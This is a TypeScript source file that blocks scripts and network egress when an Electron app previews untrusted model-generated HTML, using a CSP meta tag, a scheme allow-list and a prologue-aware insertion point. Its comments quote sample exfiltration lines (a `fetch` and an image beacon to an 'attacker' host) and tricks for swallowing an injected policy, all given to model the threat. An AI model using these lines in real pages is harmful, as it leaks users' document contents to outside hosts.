/**
 * @license
 * Copyright 2026 Ferrox Labs
 * SPDX-License-Identifier: Apache-2.0
 */

/**
 * P2-8. The policy for previewing UNTRUSTED generated HTML.
 *
 * The preview panel renders a document a model assembled out of third-party
 * data nobody vetted - a market report quoting a scraped page, a competitor
 * digest quoting a competitor - and a recurring task renders it on a schedule
 * with nobody watching. The threat is not IPC: the guest runs `sandbox=yes`,
 * `contextIsolation=yes` and has no preload, so it cannot reach `ipcBridge`.
 * The threat is EGRESS - `fetch('https://attacker/?d='+document.body.innerText)`
 * or a bare `<img src="https://attacker/pixel?d=...">`, which needs no script
 * at all. So both halves have to be shut: scripts AND the network.
 *
 * ## Why the network block is not "just CSP", and the CSP is not "just
 * `javascript=no`"
 *
 * Both of those were measured against real Electron rather than assumed:
 *
 *  - Setting `javascript: false` on the guest ALSO disables the HOST's
 *    `webContents.executeJavaScript`. It throws. The preview's scroll-sync and
 *    inspect-mode are both built on `executeJavaScript`, so turning scripts off
 *    that way silently breaks two shipped features. A `default-src 'none'` CSP
 *    stops the page's own scripts while leaving the host's injection working -
 *    verified: page script did not run, host script returned its value.
 *  - A `data:` document never passes through `webRequest.onHeadersReceived`
 *    (there is no response to attach a header to), so a header-only CSP would
 *    cover the `file://` path and miss the generated-HTML path entirely. A
 *    `file://` document DOES pass through it, and cannot carry an injected
 *    `<meta>` because the bytes are the user's file. Hence both forms: the meta
 *    for documents we assemble, the header for documents we merely point at.
 *  - Subresource requests from BOTH document kinds do reach
 *    `webRequest.onBeforeRequest` - a `https://` image inside a `data:` preview
 *    was intercepted and cancelled, and `fetch()` from it rejected. That is the
 *    layer that actually holds when everything else is bypassed.
 */

/**
 * The preview's own session.
 *
 * Deliberately NOT `persist:`-prefixed: an in-memory partition means a hostile
 * report cannot leave a cookie, a service worker, a cache entry or localStorage
 * behind for the next report to read. It also keeps the block below off every
 * other surface in the app - the ambient window, URL viewers, OAuth webviews -
 * which legitimately need the network.
 */
export const UNTRUSTED_PREVIEW_PARTITION = 'wayland-untrusted-preview';

/**
 * The policy itself.
 *
 * `default-src 'none'` is the whole point: script, connect, frame, object,
 * worker and everything else added to CSP in future default to denied, and the
 * three directives below re-admit only what a local report needs to LOOK right.
 *
 * `base-uri` is deliberately absent. The renderer injects `<base href="file://…">`
 * so relative images in a generated report resolve; `base-uri 'none'` would
 * block our own injection and leave every relative resource broken. A hostile
 * `<base>` buys nothing here, because the only thing it can redirect resolution
 * TO is a remote origin, and remote is dead twice over (this policy admits no
 * remote scheme, and the session cancels the request).
 */
export const UNTRUSTED_PREVIEW_CSP = [
  "default-src 'none'",
  'img-src data: file: blob:',
  "style-src 'unsafe-inline' data: file:",
  'font-src data: file:',
  'media-src data: file: blob:',
  "form-action 'none'",
  "frame-ancestors 'none'",
].join('; ');

/** Schemes a local preview legitimately loads. Everything else is egress. */
const LOCAL_PREVIEW_SCHEMES: ReadonlySet<string> = new Set(['file', 'data', 'blob', 'about']);

/**
 * Should this request from the preview session be cancelled?
 *
 * Fails CLOSED: a target that will not parse, or carries no scheme, is blocked.
 * An allow-list of schemes rather than a deny-list, for the same reason
 * `shellOpenSafety` allow-lists types - the set of ways to reach the network
 * grows without us, and one missed scheme is the exfiltration this exists to
 * prevent.
 */
export function isBlockedPreviewRequestUrl(rawUrl: string): boolean {
  if (typeof rawUrl !== 'string' || rawUrl.length === 0) return true;
  const separator = rawUrl.indexOf(':');
  if (separator <= 0) return true;
  const scheme = rawUrl.slice(0, separator).toLowerCase();
  // A scheme is ALPHA *( ALPHA / DIGIT / "+" / "-" / "." ) per RFC 3986; a
  // "scheme" containing anything else came from a string that is not a URL.
  if (!/^[a-z][a-z0-9+.-]*$/.test(scheme)) return true;
  return !LOCAL_PREVIEW_SCHEMES.has(scheme);
}

/** Matches any `<meta http-equiv="Content-Security-Policy" …>` the document supplied. */
const EXISTING_CSP_META = /<meta\b[^>]*http-equiv\s*=\s*["']?content-security-policy["']?[^>]*>/gi;

const CSP_META_TAG = `<meta http-equiv="Content-Security-Policy" content="${UNTRUSTED_PREVIEW_CSP}">`;

/**
 * H13. Where the policy can be written without the document being able to
 * swallow it.
 *
 * The previous implementation anchored on the first regex match of `<head…>`
 * in the raw bytes. Those bytes are a generated report quoting third-party
 * data, so the attacker writes the anchor: `<!-- <head> -->` or
 * `<html data-x="<head>">` both match, both put the injection inside a comment
 * or inside an attribute VALUE, and the policy stops being markup at all. The
 * real document then renders with no CSP.
 *
 * The fix is not a better `<head>` regex - the same trick beats every one of
 * them. It is to stop looking for `<head>`. A `<meta>` written at the very top
 * of the byte stream is hoisted into the head by the HTML parser's
 * implied-tag handling ("before html" -> "before head" -> "in head"), so it
 * lands FIRST in the real head no matter what the rest of the document says,
 * and there is nothing in front of it that could capture it.
 *
 * The single thing that must still precede us is the DOCTYPE: a `<meta>` ahead
 * of it makes the doctype a stray token and drops the page into QUIRKS mode,
 * which silently re-lays-out every generated report. So this scans only the
 * document PROLOGUE - whitespace, complete comments, then an optional doctype -
 * which is the one region where the grammar is unambiguous, and returns the
 * offset just past it.
 *
 * It fails SAFE, not open: any construct it cannot complete (an unterminated
 * comment, an unterminated doctype) rewinds to the last proven-safe offset
 * rather than guessing, so the policy is emitted earlier than ideal instead of
 * somewhere inert.
 */
function policyInsertionPoint(html: string): number {
  // A BOM belongs to the encoding, not the markup; stay behind it.
  let cursor = html.charCodeAt(0) === 0xfeff ? 1 : 0;
  // Only ever advanced past a construct we have seen END. Everything before it
  // is provably outside any comment, tag or attribute.
  let safe = cursor;

  for (;;) {
    while (cursor < html.length && /\s/.test(html[cursor])) cursor += 1;

    if (html.startsWith('<!--', cursor)) {
      const close = html.indexOf('-->', cursor + 4);
      // Unterminated: per the HTML tokenizer the comment runs to EOF, so there
      // is no later point that is markup. Emit at the last safe offset.
      if (close < 0) return safe;
      cursor = close + 3;
      safe = cursor;
      continue;
    }

    if (/^<!doctype/i.test(html.slice(cursor, cursor + 9))) {
      const close = html.indexOf('>', cursor);
      if (close < 0) return safe;
      // Past the doctype is the ONLY place both properties hold: the doctype is
      // still the first token (no quirks mode) and we are still ahead of every
      // element in the document.
      return close + 1;
    }

    return safe;
  }
}

/**
 * Put our policy where the parser will read it before anything else.
 *
 * A document-supplied CSP meta is REMOVED first. Not because it could loosen
 * ours - multiple policies intersect, so it could not - but because leaving it
 * makes the effective policy a function of attacker-controlled text, and the
 * next person reading the DOM cannot tell which one is enforcing. One policy,
 * ours, is the only auditable state.
 */
export function withPreviewCsp(html: string): string {
  const stripped = (html ?? '').replace(EXISTING_CSP_META, '');
  const at = policyInsertionPoint(stripped);
  return `${stripped.slice(0, at)}${CSP_META_TAG}${stripped.slice(at)}`;
}
